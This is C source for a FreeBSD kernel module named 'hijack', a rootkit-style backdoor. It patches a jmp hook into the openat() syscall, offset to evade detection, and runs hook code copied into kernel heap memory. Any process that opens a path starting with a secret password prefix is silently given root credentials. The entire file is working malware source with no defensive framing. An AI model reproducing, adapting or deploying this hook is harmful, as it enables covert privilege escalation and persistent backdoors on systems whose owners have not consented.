#include <sys/param.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/proc.h>
#include <sys/pcpu.h>
#include <sys/syscall.h>
#include <sys/sysent.h>
#include <sys/types.h>
#include <sys/malloc.h>

// dummy noinline function to prevent some code from being
// optimized out by the compiler.
static int
__attribute__ ((noinline)) dummyret(struct thread *td, void *syscall_args) {
    return (td == (void *) NULL && syscall_args == (void *) NULL) ? 1 : 0;
}

// grabs the program counter and places it in ecx.
static void
__attribute__ ((noinline)) get_pc_ecx() {
    __asm__ volatile ("mov 4(%esp), %ecx");
}

// syscall hook.
static int
new_sy_call(struct thread *td, void *syscall_args) {

    // arguments of the openat() syscall.
    struct sc_args {
        int fd;
        char *path;
        int flag;
        mode_t mode;
    };

    // nop sled where the jmp from old_sy_call will land.
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");

    // since we reach this function by jmping from old_sy_call to the nop sled,
    // our function's (new_sy_call's) function prologue wouldn't have been executed.
    // we need to manually set up this function's (new_sy_call's) function prologue.
    //
    // since the jmphook is placed a few instruction bytes into old_sy_call,
    // "push %ebp" and "mov %esp, %ebp" would have been executed by old_sy_call.
    // __asm__ volatile ("push %ebp");
    // __asm__ volatile ("mov %esp, %ebp");
    __asm__ volatile ("push %edi");
    __asm__ volatile ("push %esi");
    __asm__ volatile ("movl 0xc(%ebp), %edi");
    __asm__ volatile ("movl 0x8(%ebp), %esi");

    // dummyret() down below causes the compiler to move td and
    // syscall_args to registers esi and edi.

    // push the args of old_sy_call on the stack.
    __asm__ volatile ("push %edi");
    __asm__ volatile ("push %esi");

    // push old_sy_call's return address.
    get_pc_ecx(); // get program counter and place into ecx.
    __asm__ volatile ("addl $35, %ecx"); // make ecx point to the nop sled below.
    __asm__ volatile ("push %ecx"); // push ecx as old_sy_call's return address.

    // execute the instruction bytes of old_sy_call that were overwritten when
    // we overwrote the old_sy_call's first few bytes to jmp to this function.
    __asm__ volatile ("push %ebp");
    __asm__ volatile ("mov  %esp, %ebp");
    __asm__ volatile ("push %edi");
    __asm__ volatile ("push %esi");
    __asm__ volatile ("movl 0xc(%ebp), %edi");

    // the following trick jmps to old_sy_call+8 (old_sy_call: 0xc0c42820).
    // this achieves an absolute jmp.
    __asm__ volatile ("movl $0xc0c42828, %ecx");
    __asm__ volatile ("push %ecx");
    // dummyret() prevents code below from being optimized out by the compiler.
    int retval = dummyret(td, syscall_args);
    // expression is always true so jmp-ret trick is always performed.
    if (retval == 0) {
        __asm__ volatile ("ret");
    }

    // nop sled where old_sy_call will return to.
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");

    // pop off old_sy_call's arguments
    __asm__ volatile ("pop %esi");
    __asm__ volatile ("pop %edi");

    // if the syscall's return value is not 0,
    // then just return because the arguments may not point
    // to a valid page/may not be mapped.
    if (retval != 0) {
        goto returnlabel;
    }

    struct sc_args *args = (struct sc_args *) syscall_args;
    char *str = args->path;

    // check if the string argument to openat() contains the password prefix.
    // note that if the string is shorter than the password or if
    // the string does not match the password, then the check
    // will terminate early and prevent reading out of
    // bounds of the array due to C's short circuiting behavior.
    if (str[0] == '*' &&
        str[1] == '3' &&
        str[2] == 'f' &&
        str[3] == '5' &&
        str[4] == 'b' &&
        str[5] == '1') {

        // escalate the thread to root.
        td->td_ucred->cr_uid =
            td->td_ucred->cr_ruid =
            td->td_ucred->cr_svuid =
            td->td_ucred->cr_gid =
            td->td_ucred->cr_rgid =
            td->td_ucred->cr_svgid =
            0u;
    }

returnlabel:
    return (retval);
}

// places the bytes of addr into the bytes array in little endian order.
static void
p32(uint8_t bytes[], void *addr) {

    uint32_t addr32 = (uint32_t) addr;
    bytes[0] = addr32 & 0xff;
    bytes[1] = (addr32 >> 8) & 0xff;
    bytes[2] = (addr32 >> 16) & 0xff;
    bytes[3] = (addr32 >> 24) & 0xff;
}

// crafts a relative jmp instruction that jmps from src to dest address.
// the jmp instruction is placed into the bytes array.
static void
craft_jmphook(uint8_t jmphook[], void *src, void *dest) {

    // jump near, relative, displacement relative to next instruction
    jmphook[0] = 0xe9;
    // subtract 5 because this relative jmp is 5 bytes long
    // and the jmp is relative to the next instruction.
    p32(&(jmphook[1]), (void *) ((char *)dest - (char *)src - 5));
}

// writes the jmphook contained in the bytes array to the target address.
static void
overwrite_jmphook(uint8_t jmphook[], void *target_addr) {

    char *addr = (char *)target_addr;
    addr[0] = jmphook[0];
    addr[1] = jmphook[1];
    addr[2] = jmphook[2];
    addr[3] = jmphook[3];
    addr[4] = jmphook[4];
}

// function that is called when the module is loaded and unloaded.
static int
load(struct module *module, int cmd, void *arg) {

    switch (cmd) {
    case MOD_LOAD: {
        // the following is executed during module load.

        // function pointer to the old syscall implementation of openat() syscall.
        // we use a char * for the sake of pointer arithmetic convenience later on.
        char *old_sy_call = (char *)sysent[SYS_openat].sy_call;

        // malloc must not cause this process to be to put to sleep (NO_WAIT),
        // so it must use system reserve (so that the request can be satisfied
        // without this process being put to sleep).
        // the malloc region surprisingly has execute permissions.
        char *malloc_addr = malloc(256ul, M_TEMP, M_NOWAIT | M_USE_RESERVE);

        // jmp from old_sy_call + 3 to malloc_addr + 16 to make it less likely
        // to be detected.
        uint8_t jmphook[5];
        craft_jmphook(jmphook, old_sy_call + 3, malloc_addr + 16);
        overwrite_jmphook(jmphook, old_sy_call + 3);

        // copy the instruction bytes in new_sy_call (the hook) to the malloc region.
        char *new_sy_call_addr = (char *)new_sy_call;
        for (unsigned int i = 0; i < 256u; i++) {

            // if we hit a page boundary, break out because
            // the permissions may not be the same across different pages.
            if ((unsigned int)(new_sy_call_addr + i) % PAGE_SIZE == 0) {
                break;
            }

            malloc_addr[i] = new_sy_call_addr[i];
        }

        break;
    }

    default:
        break;
    }

    return (0);
}

/* The second argument of DECLARE_MODULE. */
static moduledata_t hijack_mod = {
    "hijack",       /* module name */
    load,           /* event handler */
    NULL            /* extra data */
};

DECLARE_MODULE(hijack, hijack_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
